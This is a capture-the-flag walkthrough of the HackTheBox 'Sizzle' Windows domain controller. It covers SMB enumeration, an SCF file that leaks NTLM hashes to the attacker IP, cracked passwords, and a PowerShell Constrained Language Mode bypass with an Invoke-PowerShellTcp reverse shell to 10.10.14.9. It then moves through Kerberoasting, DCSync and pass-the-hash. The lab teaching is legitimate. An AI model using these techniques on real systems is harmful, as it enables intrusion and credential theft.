# Sizzle

## Amanda Shell&#x20;

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.73.156   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 00:20 EDT
Nmap scan report for 10.129.73.156
Host is up (0.0075s latency).
Not shown: 65507 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49692/tcp open  unknown
49695/tcp open  unknown
49700/tcp open  unknown
49713/tcp open  unknown
```

### Anonymous FTP

This machine allows for anomyous FTP access, but there's nothing present in the server:

```
$ ftp 10.129.73.156
Connected to 10.129.73.156.
220 Microsoft FTP Service
Name (10.129.73.156:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||56291|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

Let's move on for now, we might need this later.&#x20;

### HTTP

This just shows a GIF of bacon sizzling:

<figure><img src="../../../.gitbook/assets/image (1883).png" alt=""><figcaption></figcaption></figure>

When viewing the page source, this is located at the `/images` directory, which we don't have access to. However, it does tell us this is an IIS server based on the error page:

<figure><img src="../../../.gitbook/assets/image (2750).png" alt=""><figcaption></figcaption></figure>

### SMB Shares Enumeration

`enum4linux` works with `guest` credentials.

```bash
$ enum4linux -u 'guest' -p '' -a 10.129.73.156
<TRUNCATED>
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 

```

`smbmap` can confirm this:

```
$ smbmap -u 'guest' -p '' -H 10.129.73.156                          
[+] IP: 10.129.73.156:445       Name: 10.129.73.156                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              NO ACCESS       Active Directory Certificate Services share
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Operations                                              NO ACCESS
        SYSVOL                                                  NO ACCESS       Logon server share
```

Within the Department Shares, there are loads of directories:

```
$ smbclient -U 'guest' '//10.129.73.156/Department Shares'  
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 11:22:32 2018
  ..                                  D        0  Tue Jul  3 11:22:32 2018
  Accounting                          D        0  Mon Jul  2 15:21:43 2018
  Audit                               D        0  Mon Jul  2 15:14:28 2018
  Banking                             D        0  Tue Jul  3 11:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018
  Devops                              D        0  Mon Jul  2 15:19:33 2018
  Finance                             D        0  Mon Jul  2 15:11:57 2018
  HR                                  D        0  Mon Jul  2 15:16:11 2018
  Infosec                             D        0  Mon Jul  2 15:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018
  IT                                  D        0  Mon Jul  2 15:12:04 2018
  Legal                               D        0  Mon Jul  2 15:12:09 2018
  M&A                                 D        0  Mon Jul  2 15:15:25 2018
  Marketing                           D        0  Mon Jul  2 15:14:43 2018
  R&D                                 D        0  Mon Jul  2 15:11:47 2018
  Sales                               D        0  Mon Jul  2 15:14:37 2018
  Security                            D        0  Mon Jul  2 15:21:47 2018
  Tax                                 D        0  Mon Jul  2 15:16:54 2018
  Users                               D        0  Tue Jul 10 17:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018
```

The `Users` directory gives me a list of usernames to work with and perhaps ASREP-Roast:

```
  amanda                              D        0  Mon Jul  2 15:18:43 2018
  amanda_adm                          D        0  Mon Jul  2 15:19:06 2018
  bill                                D        0  Mon Jul  2 15:18:28 2018
  bob                                 D        0  Mon Jul  2 15:18:31 2018
  chris                               D        0  Mon Jul  2 15:19:14 2018
  henry                               D        0  Mon Jul  2 15:18:39 2018
  joe                                 D        0  Mon Jul  2 15:18:34 2018
  jose                                D        0  Mon Jul  2 15:18:53 2018
  lkys37en                            D        0  Tue Jul 10 17:39:04 2018
  morgan                              D        0  Mon Jul  2 15:18:48 2018
  mrb3n                               D        0  Mon Jul  2 15:19:20 2018
  Public                              D        0  Wed Sep 26 01:45:32 2018
```

The `ZZ_Archive` directory contains a lot of different files which all have the same size and edit date with different extensions.&#x20;

```
smb: \ZZ_ARCHIVE\> ls
  .                                   D        0  Mon Jul  2 15:32:58 2018
  ..                                  D        0  Mon Jul  2 15:32:58 2018
  AddComplete.pptx                    A   419430  Mon Jul  2 15:32:58 2018
  AddMerge.ram                        A   419430  Mon Jul  2 15:32:57 2018
  ConfirmUnprotect.doc                A   419430  Mon Jul  2 15:32:57 2018
  ConvertFromInvoke.mov               A   419430  Mon Jul  2 15:32:57 2018
  ConvertJoin.docx                    A   419430  Mon Jul  2 15:32:57 2018
  CopyPublish.ogg                     A   419430  Mon Jul  2 15:32:57 2018
  <TRUNCATED>
```

All of these folders were rather useless and contained nothing of interest. I tried ASREP-Roasting the users but to no avail as well. My thought process was that since we cannot use anything within the share, perhaps we have to put something there.

### SCF File -> NTLM Hash

In another machine [Driver ](https://rouvin.gitbook.io/ibreakstuff/writeups/hackthebox/easy/drive)on HTB, we had to create a `.scf` file that was being clicked by the user in order to capture NTLM hashes via `responder`. I tried the same thing here.

First, I mounted the SMB share.&#x20;

```
$ sudo mount -t cifs '//10.129.73.156/Department Shares' ~/htb/sizzle/mnt
[sudo] password for kali: 
Password for root@//10.129.73.156/Department Shares:
```

I started with the most out place file to try the exploit, which was the `ZZ_ARCHIVE` directory. Then, we can place this file within it:

```
[Shell]
Command=2
IconFile=\\10.10.14.9\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

There was nothing for this particular directory, and it looks like nothing was happening. So I decided to check exactly which directories I could write to. I used ChatGPT (the best tool ever) to create a quick script to do this:

```bash
#!/bin/bash
create_test_file() {
    local dir=$1
    if touch "$dir/test" 2>/dev/null; then
        echo "Created file 'test' in directory: $dir"
    fi
}

traverse_directories() {
    local dir=$1
    create_test_file "$dir"
    for subdir in "$dir"/*; do
        if [[ -d "$subdir" ]]; then
            traverse_directories "$subdir"
        fi
    done
}
root_directory="/home/kali/htb/sizzle/mnt"

traverse_directories "$root_directory"
```

The output was this:

```
# ./write.sh 
Created file 'test' in directory: /home/kali/htb/sizzle/mnt/Users/Public
Created file 'test' in directory: /home/kali/htb/sizzle/mnt/ZZ_ARCHIVE
```

So I could also write to that Public file. I copied the `test.scf` file there and `responder` captured a hash!

<figure><img src="../../../.gitbook/assets/image (1302).png" alt=""><figcaption></figcaption></figure>

We can crack this hash easily with `john`:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)     
1g 0:00:00:04 DONE (2023-05-26 06:26) 0.2415g/s 2757Kp/s 2757Kc/s 2757KC/s Ashiah08..Ariel!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

However, this password cannot be used to `evil-winrm` in to the machine.

### CertEnroll -> User Shell

With these credentials, we can actually access another share:

```
$ smbmap -u amanda -p Ashare1972 -H 10.129.73.156         
[+] IP: 10.129.73.156:445       Name: 10.129.73.156                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        Department Shares                                       READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Operations                                              NO ACCESS
        SYSVOL                                                  READ ONLY       Logon server share
```

Now the CertEnroll share is available. CertEnroll is a reference to an ADCS service that provides a web platform to enroll certificates. This means that `/certsrv` is probably present on the web server, and visiting it requires credentials:

<figure><img src="../../../.gitbook/assets/image (2360).png" alt=""><figcaption></figcaption></figure>

Using the credentials we have, we can access it:

<figure><img src="../../../.gitbook/assets/image (3656).png" alt=""><figcaption></figcaption></figure>

We can try to request a certificate, and this presents us with 2 options:

<figure><img src="../../../.gitbook/assets/image (3352).png" alt=""><figcaption></figcaption></figure>

Clicking on User Certificate brings us to a page requesting its key strength:

<figure><img src="../../../.gitbook/assets/image (1755).png" alt=""><figcaption></figcaption></figure>

For some reason, I cannot specify the key strength in this, so we probably aren't supposed to have this functionality. In this case, we can check the advanced request form:

<figure><img src="../../../.gitbook/assets/image (614).png" alt=""><figcaption></figcaption></figure>

It appears we have to create a certificate ourselves, then use it to submit a request to be approved. I know that certificates can be used for authentication purposes, and this service is used to signed the certificates to 'make them legit'. As such, we can create a Certificate Signing Request (CSR) via `openssl`.&#x20;

```bash
$ openssl req -new -newkey rsa:2048 -nodes -keyout user.key -out user.csr
```

Then, we can grab the `.csr` contents and paste it into the box:

<figure><img src="../../../.gitbook/assets/image (1676).png" alt=""><figcaption></figcaption></figure>

When submitted, we would get the option to download the certificate:

<figure><img src="../../../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>

This would download a `.cer` file to our machine. Using this, we can try to get a shell. Googling online led me to someone's OSCP notes, and it appears it is possible to get a WinRM shell using this certificate with some Ruby code:

{% embed url="https://gist.github.com/tothi/addf01e516bb3a54f73bde45cfd7db74" %}

Using this, we can get a shell as Amanda:

<figure><img src="../../../.gitbook/assets/image (3279).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Bloodhound -> Kerberoastable&#x20;

Before starting my enumeration within the machine, we can use `bloodhound-python` to scope what we need to do (else we'll be heading in blind).&#x20;

```bash
$ bloodhound-python -d HTB.local -u amanda -p Ashare1972 -c all -ns 10.129.101.141
```

Then, start `bloodhound` and `neo4j`, then upload the data required. I found that the user `amanda` has no privileges at all. Checking the Kerberoastable accounts, we find that `mrlky` is a possible target.

<figure><img src="../../../.gitbook/assets/image (1373).png" alt=""><figcaption></figcaption></figure>

Checking the privileges of this user, we can see that they have DCSync privileges over the forest.

<figure><img src="../../../.gitbook/assets/image (2455).png" alt=""><figcaption></figcaption></figure>

So that's the attack path. Normally, I would aim to Kerberoast remotely for both OPSEC reasons and also because `impacket` is just so easy to use. However, in our initial `nmap` scan, port 88 is not public facing. This means that we **have** to Kerberoast on the machine itself using `rubeus.exe`.&#x20;

### CLM + AppLocker -> CLM Bypass

I tried to download and execute Rubeus, but this is the error I get due to AppLocker:

<figure><img src="../../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

Other tools like `PowerView.ps1` don't work as well. The current shell that I have is extremely limited in  We can check the Execution Context to confirm this:

```
PS > $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

There are 2 methods of exploitation here. One is we could run a Kerberoast Powershell script that would involve bypassing CLM. Fortunately, iRedTeam has a whole article detailing a method that involves Powershell versions.&#x20;

{% embed url="https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass" %}

All we need to do is specify that we want to use Powershell Version 2:

<figure><img src="../../../.gitbook/assets/image (1168).png" alt=""><figcaption></figcaption></figure>

Using this method, we can run some scripts using this. However, its even better if we can get a CLM Bypassed shell. To do so, we can simply download the `Invoke-PowerShellTcp` shell to the machine, and then run this command:

```powershell
powershell -version 2 -nop -nop -noexit -exec bypass -c '.\shell.ps1'
```

<figure><img src="../../../.gitbook/assets/image (3860).png" alt=""><figcaption></figcaption></figure>

Great! Now we have a fully functioning shell.&#x20;

### Invoke-Kerberoast

Since we have a full shell, we don't actually need Rubeus anymore as there are plenty of Kerberoasting Powershell scripts that (hopefully) don't trigger AppLocker.&#x20;

However, trying to run this gives me a weird error:

{% code overflow="wrap" %}
```
PS C:\Users\amanda\Documents>. .\Invoke-Kerberoast.ps1
PS C:\Users\amanda\Documents> Invoke-Kerberoast
PS C:\Users\amanda\Documents> Invoke-PowerShellTcp : The variable cannot be validated because the value  is not a valid value fo
r the SPN variable.

At C:\Users\amanda\Documents\shell.ps1:127 char:21
+ Invoke-PowerShellTcp <<<<  -Reverse -IPAddress 10.10.14.9 -Port 4444
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShell 
   Tcp
```
{% endcode %}

We can follow the PowerSploit documentation to resolve this.&#x20;

```powershell
$SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\amanda', $SecPassword)
. .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -Credential $Cred -Verbose | fl
```

The above still doesn't work because it complains that we don't have the`Invoke-UserImpersonation` cmdlet imported. This means we have to import `PowerView.ps1` as well.

<pre class="language-powershell"><code class="lang-powershell">. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\amanda', $SecPassword)
<strong>Invoke-UserImpersonation -Credential $Cred
</strong>Invoke-Kerberoast
</code></pre>

After running this, a hash for the user is given to us:

<figure><img src="../../../.gitbook/assets/image (3228).png" alt=""><figcaption></figcaption></figure>

Transfer this to our machine, and we can crack it easily with `john`:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt ticket_hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)     
1g 0:00:00:04 DONE (2023-05-26 09:48) 0.2331g/s 2603Kp/s 2603Kc/s 2603KC/s Forever3!..Flubb3r
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### DCSync

Earlier, we saw that this user had DCSync privileges over the domain, so we can easily use `secretsdump.py` to dump the administrator hash:

<figure><img src="../../../.gitbook/assets/image (3347).png" alt=""><figcaption></figcaption></figure>

Then, we can use `smbexec.py` to pass the hash and get an administrator shell.

<figure><img src="../../../.gitbook/assets/image (2225).png" alt=""><figcaption></figcaption></figure>

Then we can capture both the flags!
